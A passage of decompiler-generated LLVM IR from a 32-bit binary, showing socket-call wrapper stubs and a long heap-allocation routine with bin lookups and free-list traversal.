  uselistorder label %dec_label_pc_804dbd8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804d96c, { 1, 0 }
}

define i32 @function_804dc0c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804dc0c:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804dc27 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804dc2e = call i32 @function_804f9b0(i32 5, i32 %v2_804dc27)
  ret i32 %v2_804dc2e

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_804dc38(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804dc38:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804dc53 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804dc5a = call i32 @function_804f9b0(i32 2, i32 %v2_804dc53)
  ret i32 %v2_804dc5a

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_804dc64(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804dc64:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804dc7f = ptrtoint i32* %stack_var_-12 to i32
  %v2_804dc86 = call i32 @function_804f9b0(i32 3, i32 %v2_804dc7f)
  ret i32 %v2_804dc86

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_804dc90(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804dc90:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-8, align 4
  %v2_804dca3 = ptrtoint i32* %stack_var_-8 to i32
  %v2_804dcaa = call i32 @function_804f9b0(i32 4, i32 %v2_804dca3)
  ret i32 %v2_804dcaa

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_804dcb4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804dcb4:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804dcd7 = ptrtoint i32* %stack_var_-16 to i32
  %v2_804dcde = call i32 @function_804f9b0(i32 10, i32 %v2_804dcd7)
  ret i32 %v2_804dcde

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @function_804dce8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_804dce8:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_804dd1b = ptrtoint i32* %stack_var_-24 to i32
  %v2_804dd22 = call i32 @function_804f9b0(i32 11, i32 %v2_804dd1b)
  ret i32 %v2_804dd22

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_804dd2c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_804dd2c:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_804dd57 = ptrtoint i32* %stack_var_-20 to i32
  %v2_804dd5e = call i32 @function_804f9b0(i32 14, i32 %v2_804dd57)
  ret i32 %v2_804dd5e

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_804dd68(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804dd68:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804dd83 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804dd8a = call i32 @function_804f9b0(i32 1, i32 %v2_804dd83)
  ret i32 %v2_804dd8a

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_804dd94() local_unnamed_addr {
dec_label_pc_804dd94:
  %v0_804dd94 = load i32, i32* @eax, align 4
  %v6_804dda7 = icmp ugt i32 %v0_804dd94, 16777215
  br i1 %v6_804dda7, label %dec_label_pc_804ddb8, label %dec_label_pc_804dda9

dec_label_pc_804dda9:                             ; preds = %dec_label_pc_804dd94
  %tmp = icmp ult i32 %v0_804dd94, 256
  %v2_804dd96 = udiv i32 %v0_804dd94, 256
  %v2_804dda9 = call i32 @llvm.ctlz.i32(i32 %v2_804dd96, i1 true)
  %v3_804dda9 = xor i32 %v2_804dda9, 31
  %v5_804dda9 = select i1 %tmp, i32 95, i32 %v3_804dda9
  %v1_804ddac = add nuw nsw i32 %v5_804dda9, 6
  store i32 %v1_804ddac, i32* @ecx, align 4
  %v2_804ddaf = urem i32 %v1_804ddac, 32
  %v4_804ddaf = icmp eq i32 %v2_804ddaf, 0
  br i1 %v4_804ddaf, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_804dda9
  %v5_804ddaf = lshr i32 %v0_804dd94, %v2_804ddaf
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_804dda9, %bb
  %v0_804ddb1 = phi i32 [ %v0_804dd94, %dec_label_pc_804dda9 ], [ %v5_804ddaf, %bb ]
  %v1_804ddb1 = urem i32 %v0_804ddb1, 4
  %v2_804ddb4 = mul nuw nsw i32 %v5_804dda9, 4
  %v3_804ddb4 = or i32 %v1_804ddb1, 32
  %v4_804ddb4 = add nuw nsw i32 %v3_804ddb4, %v2_804ddb4
  br label %dec_label_pc_804ddb8

dec_label_pc_804ddb8:                             ; preds = %dec_label_pc_804dd94, %bb4
  %v0_804ddb9 = phi i32 [ 95, %dec_label_pc_804dd94 ], [ %v4_804ddb4, %bb4 ]
  ret i32 %v0_804ddb9

; uselistorder directives
  uselistorder i32 %v2_804ddaf, { 1, 0 }
  uselistorder i32 %v0_804dd94, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_804ddb8, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_804ddba(i32 %arg1) local_unnamed_addr {
dec_label_pc_804ddba:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804ddba = load i32, i32* @ebp, align 4
  %v0_804ddbb = load i32, i32* @edi, align 4
  %v0_804ddbc = load i32, i32* @esi, align 4
  %v0_804ddbd = load i32, i32* @ebx, align 4
  store i32 %v0_804ddbd, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804ddcf = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804ddcf, i32* @eax, align 4
  store i32 %v2_804ddcf, i32* %stack_var_-92, align 4
  %v2_804ddd4 = call i32 @function_804f65e(i32 %v2_804ddcf, i32 134542939)
  store i32 %v2_804ddd4, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8056330.140 to i32), i32* %stack_var_-92, align 4
  %v1_804dde0 = call i32 @function_804f65b(i32 ptrtoint (i32* @global_var_8056330.140 to i32))
  store i32 %v1_804dde0, i32* %eax.global-to-local, align 4
  %v0_804dde8 = load i32, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v0_804dde8, -32
  br i1 %tmp, label %dec_label_pc_804ddff, label %dec_label_pc_804dded

dec_label_pc_804dded:                             ; preds = %dec_label_pc_804ddba
  %v0_804dded = load i32, i32* %stack_var_-92, align 4
  %v1_804dded = call i32 @function_804baa4(i32 %v0_804dded)
  store i32 %v1_804dded, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804ddf4 = inttoptr i32 %v1_804dded to i32*
  store i32 12, i32* %v1_804ddf4, align 4
  br label %dec_label_pc_804e552

dec_label_pc_804ddff:                             ; preds = %dec_label_pc_804ddba
  %v1_804ddff = add i32 %v0_804dde8, 11
  %tmp128 = icmp ult i32 %v1_804ddff, 16
  br i1 %tmp128, label %dec_label_pc_804de16, label %dec_label_pc_804de0f

dec_label_pc_804de0f:                             ; preds = %dec_label_pc_804ddff
  %v1_804de0f = and i32 %v1_804ddff, -8
  br label %dec_label_pc_804de16

dec_label_pc_804de16:                             ; preds = %dec_label_pc_804ddff, %dec_label_pc_804de0f
  %storemerge125 = phi i32 [ %v1_804de0f, %dec_label_pc_804de0f ], [ %v1_804ddff, %dec_label_pc_804ddff ]
  %v1_804e1b6 = phi i32 [ %v1_804de0f, %dec_label_pc_804de0f ], [ 16, %dec_label_pc_804ddff ]
  store i32 %storemerge125, i32* %eax.global-to-local, align 4
  %v0_804de16 = load i8, i8* @global_var_8058da0.141, align 1
  %v1_804de16 = sext i8 %v0_804de16 to i32
  store i32 %v1_804de16, i32* @ebx, align 4
  %v3_804de1c = urem i8 %v0_804de16, 2
  %v4_804de1c = icmp eq i8 %v3_804de1c, 0
  %v1_804de1f = icmp eq i1 %v4_804de1c, false
  br i1 %v1_804de1f, label %dec_label_pc_804de3e, label %dec_label_pc_804de21

dec_label_pc_804de21:                             ; preds = %dec_label_pc_804de16
  %v2_804de21 = icmp eq i8 %v0_804de16, 0
  %v1_804de23 = icmp eq i1 %v2_804de21, false
  br i1 %v1_804de23, label %dec_label_pc_804e121, label %dec_label_pc_804de29

dec_label_pc_804de29:                             ; preds = %dec_label_pc_804de21
  store i32 ptrtoint (i8* @global_var_8058da0.141 to i32), i32* %stack_var_-92, align 4
  %v2_804de31 = call i32 @function_804e921(i32* bitcast (i8* @global_var_8058da0.141 to i32*))
  store i32 %v2_804de31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e121

dec_label_pc_804de3e:                             ; preds = %dec_label_pc_804de16
  %v11_804de3e = trunc i32 %v1_804e1b6 to i8
  %v8_804de42 = icmp ugt i8 %v11_804de3e, %v0_804de16
  br i1 %v8_804de42, label %dec_label_pc_804de5f, label %dec_label_pc_804de44

dec_label_pc_804de44:                             ; preds = %dec_label_pc_804de3e
  %v2_804de48 = udiv i32 %v1_804e1b6, 2
  store i32 %v2_804de48, i32* %eax.global-to-local, align 4
  %v1_804de4a = add i32 %v2_804de48, ptrtoint (i8* @global_var_8058da0.141 to i32)
  store i32 %v1_804de4a, i32* @ecx, align 4
  %v1_804de50 = add i32 %v2_804de48, add (i32 ptrtoint (i8* @global_var_8058da0.141 to i32), i32 -4)
  %v2_804de50 = inttoptr i32 %v1_804de50 to i32*
  %v3_804de50 = load i32, i32* %v2_804de50, align 4
  store i32 %v3_804de50, i32* @edx, align 4
  %v1_804de53 = icmp eq i32 %v3_804de50, 0
  br i1 %v1_804de53, label %dec_label_pc_804de5f, label %dec_label_pc_804de57

dec_label_pc_804de57:                             ; preds = %dec_label_pc_804de44
  %v1_804de57 = add i32 %v3_804de50, 8
  %v2_804de57 = inttoptr i32 %v1_804de57 to i32*
  %v3_804de57 = load i32, i32* %v2_804de57, align 4
  store i32 %v3_804de57, i32* %eax.global-to-local, align 4
  store i32 %v3_804de57, i32* %v2_804de50, align 4
  br label %dec_label_pc_804de98

dec_label_pc_804de5f:                             ; preds = %dec_label_pc_804de44, %dec_label_pc_804de3e
  %v8_804de5f = icmp ult i32 %v1_804e1b6, 255
  %v6_804de67 = icmp ugt i32 %v1_804e1b6, 255
  store i32 %v1_804e1b6, i32* @eax, align 4
  br i1 %v6_804de67, label %dec_label_pc_804dea0, label %dec_label_pc_804de69

dec_label_pc_804de69:                             ; preds = %dec_label_pc_804de5f
  %v2_804de6d = udiv i32 %v1_804e1b6, 8
  store i32 %v2_804de6d, i32* %eax.global-to-local, align 4
  %v1_804de70 = mul nuw i32 %v2_804de6d, 8
  %v2_804de70 = add i32 %v1_804de70, ptrtoint (i32* @global_var_8058dcc.142 to i32)
  store i32 %v2_804de70, i32* @ecx, align 4
  %v1_804de7b = add i32 %v1_804de70, add (i32 ptrtoint (i32* @global_var_8058dcc.142 to i32), i32 12)
  %v2_804de7b = inttoptr i32 %v1_804de7b to i32*
  %v3_804de7b = load i32, i32* %v2_804de7b, align 4
  store i32 %v3_804de7b, i32* @edx, align 4
  %v12_804de7e = icmp eq i32 %v3_804de7b, %v2_804de70
  br i1 %v12_804de7e, label %dec_label_pc_804df9c.preheader, label %dec_label_pc_804de86

dec_label_pc_804de86:                             ; preds = %dec_label_pc_804de69
  store i32 %v1_804e1b6, i32* %ebx.global-to-local, align 4
  %v1_804de8a = add i32 %v3_804de7b, 12
  %v2_804de8a = inttoptr i32 %v1_804de8a to i32*
  %v3_804de8a = load i32, i32* %v2_804de8a, align 4
  store i32 %v3_804de8a, i32* %eax.global-to-local, align 4
  %v2_804de8d = or i32 %v1_804e1b6, 4
  %v3_804de8d = add i32 %v3_804de7b, %v2_804de8d
  %v4_804de8d = inttoptr i32 %v3_804de8d to i32*
  %v5_804de8d = load i32, i32* %v4_804de8d, align 4
  %v6_804de8d = or i32 %v5_804de8d, 1
  store i32 %v6_804de8d, i32* %v4_804de8d, align 4
  %v0_804de92 = load i32, i32* %eax.global-to-local, align 4
  %v1_804de92 = load i32, i32* @ecx, align 4
  %v2_804de92 = add i32 %v1_804de92, 12
  %v3_804de92 = inttoptr i32 %v2_804de92 to i32*
  store i32 %v0_804de92, i32* %v3_804de92, align 4
  %v0_804de95 = load i32, i32* @ecx, align 4
  %v1_804de95 = load i32, i32* %eax.global-to-local, align 4
  %v2_804de95 = add i32 %v1_804de95, 8
  %v3_804de95 = inttoptr i32 %v2_804de95 to i32*
  store i32 %v0_804de95, i32* %v3_804de95, align 4
  br label %dec_label_pc_804de98

dec_label_pc_804de98:                             ; preds = %dec_label_pc_804de57, %dec_label_pc_804de86
  %v0_804de98 = load i32, i32* @edx, align 4
  %v1_804de98 = add i32 %v0_804de98, 8
  store i32 %v1_804de98, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e541

dec_label_pc_804dea0:                             ; preds = %dec_label_pc_804de5f
  %v0_804dea4 = call i32 @function_804dd94()
  store i32 %v0_804dea4, i32* %eax.global-to-local, align 4
  %v3_804dea9 = and i8 %v0_804de16, 2
  %v4_804dea9 = icmp eq i8 %v3_804dea9, 0
  br i1 %v4_804dea9, label %dec_label_pc_804df9c.preheader, label %dec_label_pc_804deb6

dec_label_pc_804deb6:                             ; preds = %dec_label_pc_804dea0
  store i32 ptrtoint (i8* @global_var_8058da0.141 to i32), i32* %stack_var_-92, align 4
  %v2_804debe = call i32 @function_804e921(i32* bitcast (i8* @global_var_8058da0.141 to i32*))
  store i32 %v2_804debe, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804df9c.preheader

dec_label_pc_804df9c.preheader:                   ; preds = %dec_label_pc_804deb6, %dec_label_pc_804de69, %dec_label_pc_804dea0
  %stack_var_-40.0.ph = phi i32 [ %v2_804de6d, %dec_label_pc_804de69 ], [ %v0_804dea4, %dec_label_pc_804deb6 ], [ %v0_804dea4, %dec_label_pc_804dea0 ]
  %v1_804def2 = add i32 %v1_804e1b6, 16
  %v0_804df9c107 = load i32, i32* @global_var_8058de0.145, align 32
  store i32 %v0_804df9c107, i32* @ebp, align 4
  %v9_804dfa2110 = icmp eq i32 %v0_804df9c107, 134581716
  %v1_804dfa8112 = icmp eq i1 %v9_804dfa2110, false
  br i1 %v1_804dfa8112, label %dec_label_pc_804decb, label %dec_label_pc_804dfae

dec_label_pc_804decb:                             ; preds = %dec_label_pc_804df9c.preheader, %bb82
  %v0_804df9c113 = phi i32 [ %v0_804df9c, %bb82 ], [ %v0_804df9c107, %dec_label_pc_804df9c.preheader ]
  %v1_804decb = add i32 %v0_804df9c113, 4
  %v2_804decb = inttoptr i32 %v1_804decb to i32*
  %v3_804decb = load i32, i32* %v2_804decb, align 4
  %v1_804dece = add i32 %v0_804df9c113, 12
  %v2_804dece = inttoptr i32 %v1_804dece to i32*
  %v3_804dece = load i32, i32* %v2_804dece, align 4
  store i32 %v3_804dece, i32* @edx, align 4
  %v1_804ded1 = and i32 %v3_804decb, -4
  store i32 %v1_804ded1, i32* @edi, align 4
  br i1 %v6_804de67, label %dec_label_pc_804defd, label %dec_label_pc_804dede

dec_label_pc_804dede:                             ; preds = %dec_label_pc_804decb
  %v9_804dede = icmp eq i32 %v3_804dece, 134581716
  %v1_804dee4 = icmp eq i1 %v9_804dede, false
  br i1 %v1_804dee4, label %dec_label_pc_804defd, label %dec_label_pc_804dee6

dec_label_pc_804dee6:                             ; preds = %dec_label_pc_804dede
  %v1_804dee6 = load i32, i32* @global_var_8058dd0.143, align 16
  %v12_804dee6 = icmp eq i32 %v0_804df9c113, %v1_804dee6
  %v1_804deec = icmp eq i1 %v12_804dee6, false
  br i1 %v1_804deec, label %dec_label_pc_804defd, label %dec_label_pc_804deee

dec_label_pc_804deee:                             ; preds = %dec_label_pc_804dee6
  store i32 %v1_804def2, i32* %eax.global-to-local, align 4
  %v6_804def7 = icmp ugt i32 %v1_804ded1, %v1_804def2
  br i1 %v6_804def7, label %dec_label_pc_804e4dc, label %dec_label_pc_804defd

dec_label_pc_804defd:                             ; preds = %dec_label_pc_804deee, %dec_label_pc_804dee6, %dec_label_pc_804dede, %dec_label_pc_804decb
  store i32 ptrtoint (i32* @global_var_8058dd4.144 to i32), i32* %eax.global-to-local, align 4
  store i32 %v3_804dece, i32* @global_var_8058de0.145, align 4
  %v2_804df05 = add i32 %v3_804dece, 8
  %v3_804df05 = inttoptr i32 %v2_804df05 to i32*
  store i32 ptrtoint (i32* @global_var_8058dd4.144 to i32), i32* %v3_804df05, align 4
  %v0_804df08 = load i32, i32* @edi, align 4
  %v15_804df08 = icmp eq i32 %v0_804df08, %v1_804e1b6
  br i1 %v15_804df08, label %dec_label_pc_804e51d, label %dec_label_pc_804df12

dec_label_pc_804df12:                             ; preds = %dec_label_pc_804defd
  %v6_804df18 = icmp ugt i32 %v0_804df08, 255
  br i1 %v6_804df18, label %dec_label_pc_804df2b, label %dec_label_pc_804df1a

dec_label_pc_804df1a:                             ; preds = %dec_label_pc_804df12
  %v2_804df1c = udiv i32 %v0_804df08, 8
  store i32 %v2_804df1c, i32* %esi.global-to-local, align 4
  %v1_804df1f = mul nuw i32 %v2_804df1c, 8
  %v2_804df1f = add i32 %v1_804df1f, 134581708
  store i32 %v2_804df1f, i32* @ebx, align 4
  %v1_804df26 = add i32 %v1_804df1f, 134581716
  %v2_804df26 = inttoptr i32 %v1_804df26 to i32*
  %v3_804df26 = load i32, i32* %v2_804df26, align 4
  store i32 %v3_804df26, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804df74

dec_label_pc_804df2b:                             ; preds = %dec_label_pc_804df12
  store i32 %v0_804df08, i32* @eax, align 4
  %v0_804df2d = call i32 @function_804dd94()
  store i32 %v0_804df2d, i32* %esi.global-to-local, align 4
  %v1_804df34 = mul i32 %v0_804df2d, 8
  %v2_804df34 = add i32 %v1_804df34, ptrtoint (i32* @global_var_8058dcc.142 to i32)
  store i32 %v2_804df34, i32* %eax.global-to-local, align 4
  %v1_804df3b = add i32 %v1_804df34, add (i32 ptrtoint (i32* @global_var_8058dcc.142 to i32), i32 8)
  %v2_804df3b = inttoptr i32 %v1_804df3b to i32*
  %v3_804df3b = load i32, i32* %v2_804df3b, align 4
  store i32 %v3_804df3b, i32* %edx.global-to-local, align 4
  %v12_804df3e = icmp eq i32 %v3_804df3b, %v2_804df34
  store i32 %v3_804df3b, i32* @ebx, align 4
  br i1 %v12_804df3e, label %dec_label_pc_804df74, label %dec_label_pc_804df48

dec_label_pc_804df48:                             ; preds = %dec_label_pc_804df2b
  %v1_804df48 = add i32 %v1_804df34, add (i32 ptrtoint (i32* @global_var_8058dcc.142 to i32), i32 12)
  %v2_804df48 = inttoptr i32 %v1_804df48 to i32*
  %v3_804df48 = load i32, i32* %v2_804df48, align 4
  store i32 %v3_804df48, i32* @ebx, align 4
  %v0_804df4b = load i32, i32* @edi, align 4
  %v2_804df4b = add i32 %v3_804df48, 4
  %v3_804df4b = inttoptr i32 %v2_804df4b to i32*
  %v4_804df4b = load i32, i32* %v3_804df4b, align 4
  %v10_804df4b = icmp ult i32 %v0_804df4b, %v4_804df4b
  %v1_804df4e = icmp eq i1 %v10_804df4b, false
  br i1 %v1_804df4e, label %dec_label_pc_804df56, label %dec_label_pc_804df74

dec_label_pc_804df56:                             ; preds = %dec_label_pc_804df48
  %v1_804df58 = or i32 %v0_804df4b, 1
  store i32 %v1_804df58, i32* %eax.global-to-local, align 4
  store i32 %v3_804df3b, i32* %ebx.global-to-local, align 4
  %v2_804df6c100 = add i32 %v3_804df3b, 4
  %v3_804df6c101 = inttoptr i32 %v2_804df6c100 to i32*
  %v4_804df6c102 = load i32, i32* %v3_804df6c101, align 4
  %v10_804df6c104 = icmp ult i32 %v1_804df58, %v4_804df6c102
  br i1 %v10_804df6c104, label %dec_label_pc_804df5d, label %dec_label_pc_804df71

dec_label_pc_804df5d:                             ; preds = %dec_label_pc_804df56, %dec_label_pc_804df5d
  %v0_804df71105 = phi i32 [ %v3_804df61, %dec_label_pc_804df5d ], [ %v3_804df3b, %dec_label_pc_804df56 ]
  store i32 %v0_804df71105, i32* %ecx.global-to-local, align 4
  %v1_804df61 = add i32 %v0_804df71105, 8
  %v2_804df61 = inttoptr i32 %v1_804df61 to i32*
  %v3_804df61 = load i32, i32* %v2_804df61, align 4
  store i32 %v3_804df61, i32* %ecx.global-to-local, align 4
  store i32 %v3_804df61, i32* %ebx.global-to-local, align 4
  %v2_804df6c = add i32 %v3_804df61, 4
  %v3_804df6c = inttoptr i32 %v2_804df6c to i32*
  %v4_804df6c = load i32, i32* %v3_804df6c, align 4
  %v10_804df6c = icmp ult i32 %v1_804df58, %v4_804df6c
  br i1 %v10_804df6c, label %dec_label_pc_804df5d, label %dec_label_pc_804df71

dec_label_pc_804df71:                             ; preds = %dec_label_pc_804df5d, %dec_label_pc_804df56
  %v0_804df71.lcssa = phi i32 [ %v3_804df3b, %dec_label_pc_804df56 ], [ %v3_804df61, %dec_label_pc_804df5d ]
  %v1_804df71 = add i32 %v0_804df71.lcssa, 12
  %v2_804df71 = inttoptr i32 %v1_804df71 to i32*
  %v3_804df71 = load i32, i32* %v2_804df71, align 4
  store i32 %v3_804df71, i32* @ebx, align 4
  br label %dec_label_pc_804df74

dec_label_pc_804df74:                             ; preds = %dec_label_pc_804df1a, %dec_label_pc_804df48, %dec_label_pc_804df2b, %dec_label_pc_804df71
  %v0_804df74 = phi i32 [ %v0_804df2d, %dec_label_pc_804df2b ], [ %v0_804df2d, %dec_label_pc_804df71 ], [ %v0_804df2d, %dec_label_pc_804df48 ], [ %v2_804df1c, %dec_label_pc_804df1a ]
  %stack_var_-64.1 = phi i32 [ %v3_804df3b, %dec_label_pc_804df2b ], [ %v0_804df71.lcssa, %dec_label_pc_804df71 ], [ %v2_804df34, %dec_label_pc_804df48 ], [ %v3_804df26, %dec_label_pc_804df1a ]
  %v1_804df76 = urem i32 %v0_804df74, 32
  %v2_804df76 = icmp eq i32 %v1_804df76, 0
  store i32 %v1_804df76, i32* %esi.global-to-local, align 4
  store i32 %v1_804df76, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804df80 = sdiv i32 %v0_804df74, 32
  store i32 %v2_804df80, i32* %edx.global-to-local, align 4
  br i1 %v2_804df76, label %bb82, label %bb

bb:                                               ; preds = %dec_label_pc_804df74
  %v5_804df83 = shl i32 1, %v1_804df76
  store i32 %v5_804df83, i32* %eax.global-to-local, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_804df74, %bb
  %v5_804df85 = phi i32 [ 1, %dec_label_pc_804df74 ], [ %v5_804df83, %bb ]
  %v1_804df85 = mul nsw i32 %v2_804df80, 4
  %v2_804df85 = add i32 %v1_804df85, ptrtoint (i32* @global_var_80590d4.146 to i32)
  %v3_804df85 = inttoptr i32 %v2_804df85 to i32*
  %v4_804df85 = load i32, i32* %v3_804df85, align 4
  %v6_804df85 = or i32 %v4_804df85, %v5_804df85
  store i32 %v6_804df85, i32* %v3_804df85, align 4
  %v0_804df8c = load i32, i32* @ebx, align 4
  %v1_804df8c = load i32, i32* @ebp, align 4
  %v2_804df8c = add i32 %v1_804df8c, 12
  %v3_804df8c = inttoptr i32 %v2_804df8c to i32*
  store i32 %v0_804df8c, i32* %v3_804df8c, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_804df93 = load i32, i32* @ebp, align 4
  %v2_804df93 = add i32 %v1_804df93, 8
  %v3_804df93 = inttoptr i32 %v2_804df93 to i32*
  store i32 %stack_var_-64.1, i32* %v3_804df93, align 4
  %v0_804df96 = load i32, i32* @ebp, align 4
  %v1_804df96 = load i32, i32* @esi, align 4
  %v2_804df96 = add i32 %v1_804df96, 12
  %v3_804df96 = inttoptr i32 %v2_804df96 to i32*
  store i32 %v0_804df96, i32* %v3_804df96, align 4
  %v0_804df99 = load i32, i32* @ebp, align 4
  %v1_804df99 = load i32, i32* @ebx, align 4
  %v2_804df99 = add i32 %v1_804df99, 8
  %v3_804df99 = inttoptr i32 %v2_804df99 to i32*
  store i32 %v0_804df99, i32* %v3_804df99, align 4
  %v0_804df9c = load i32, i32* @global_var_8058de0.145, align 32
  store i32 %v0_804df9c, i32* @ebp, align 4
  %v9_804dfa2 = icmp eq i32 %v0_804df9c, 134581716
  %v1_804dfa8 = icmp eq i1 %v9_804dfa2, false
  br i1 %v1_804dfa8, label %dec_label_pc_804decb, label %dec_label_pc_804dfae

dec_label_pc_804dfae:                             ; preds = %bb82, %dec_label_pc_804df9c.preheader
  br i1 %v8_804de5f, label %dec_label_pc_804e03c, label %dec_label_pc_804dfbc

dec_label_pc_804dfbc:                             ; preds = %dec_label_pc_804dfae
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_804dfc0 = mul i32 %stack_var_-40.0.ph, 8
  %v2_804dfc0 = add i32 %v1_804dfc0, ptrtoint (i32* @global_var_8058dcc.142 to i32)
  store i32 %v2_804dfc0, i32* %edx.global-to-local, align 4
  %v1_804dfc7 = add i32 %v1_804dfc0, add (i32 ptrtoint (i32* @global_var_8058dcc.142 to i32), i32 12)
  %v2_804dfc7 = inttoptr i32 %v1_804dfc7 to i32*
  %storemerge1.pre = load i32, i32* %v2_804dfc7, align 4
  br label %dec_label_pc_804e038

dec_label_pc_804dfcc:                             ; preds = %dec_label_pc_804e038
  %v1_804dfcc = add i32 %v4_804dfe3, 4
  %v2_804dfcc = inttoptr i32 %v1_804dfcc to i32*
  %v3_804dfcc = load i32, i32* %v2_804dfcc, align 4
  store i32 %v3_804dfcc, i32* %ebx.global-to-local, align 4
  %v1_804dfcf = add i32 %v4_804dfe3, 12
  %v2_804dfcf = inttoptr i32 %v1_804dfcf to i32*
  %v3_804dfcf = load i32, i32* %v2_804dfcf, align 4
  store i32 %v3_804dfcf, i32* @ecx, align 4
  %v1_804dfd2 = and i32 %v3_804dfcc, -4
  store i32 %v1_804dfd2, i32* @ebx, align 4
  %v10_804dfd5 = icmp ult i32 %v1_804dfd2, %v1_804e1b6
  br i1 %v10_804dfd5, label %dec_label_pc_804e038, label %dec_label_pc_804dfdb

dec_label_pc_804dfdb:                             ; preds = %dec_label_pc_804dfcc
  %v1_804dfdb = add i32 %v4_804dfe3, 8
  %v2_804dfdb = inttoptr i32 %v1_804dfdb to i32*
  %v3_804dfdb = load i32, i32* %v2_804dfdb, align 4
  store i32 %v3_804dfdb, i32* @edx, align 4
  %v1_804dfde = add i32 %v3_804dfdb, 12
  %v2_804dfde = inttoptr i32 %v1_804dfde to i32*
  %v3_804dfde = load i32, i32* %v2_804dfde, align 4
  %v15_804dfde = icmp eq i32 %v3_804dfde, %v4_804dfe3
  %v1_804dfe1 = icmp eq i1 %v15_804dfde, false
  br i1 %v1_804dfe1, label %dec_label_pc_804dfe8, label %dec_label_pc_804dfe3

dec_label_pc_804dfe3:                             ; preds = %dec_label_pc_804dfdb
  %v1_804dfe3 = add i32 %v3_804dfcf, 8
  %v2_804dfe3 = inttoptr i32 %v1_804dfe3 to i32*
  %v3_804dfe3 = load i32, i32* %v2_804dfe3, align 4
  %v15_804dfe3 = icmp eq i32 %v3_804dfe3, %v4_804dfe3
  br i1 %v15_804dfe3, label %dec_label_pc_804dfed, label %dec_label_pc_804dfe8

dec_label_pc_804dfe8:                             ; preds = %dec_label_pc_804dfe3, %dec_label_pc_804dfdb
  %v0_804dfe8 = call i32 @function_804ec88()
  store i32 %v0_804dfe8, i32* %eax.global-to-local, align 4
  %v0_804dfed.pre = load i32, i32* @ebx, align 4
  %v0_804dff3.pre = load i32, i32* @ecx, align 4
  %v1_804dff3.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804dfed

dec_label_pc_804dfed:                             ; preds = %dec_label_pc_804dfe3, %dec_label_pc_804dfe8
  %v1_804dff3 = phi i32 [ %v3_804dfdb, %dec_label_pc_804dfe3 ], [ %v1_804dff3.pre, %dec_label_pc_804dfe8 ]
  %v0_804dff3 = phi i32 [ %v3_804dfcf, %dec_label_pc_804dfe3 ], [ %v0_804dff3.pre, %dec_label_pc_804dfe8 ]
  %v0_804dfed = phi i32 [ %v1_804dfd2, %dec_label_pc_804dfe3 ], [ %v0_804dfed.pre, %dec_label_pc_804dfe8 ]
  %v5_804dfef = sub i32 %v0_804dfed, %v1_804e1b6
  store i32 %v5_804dfef, i32* %esi.global-to-local, align 4
  %v2_804dff3 = add i32 %v1_804dff3, 12
  %v3_804dff3 = inttoptr i32 %v2_804dff3 to i32*
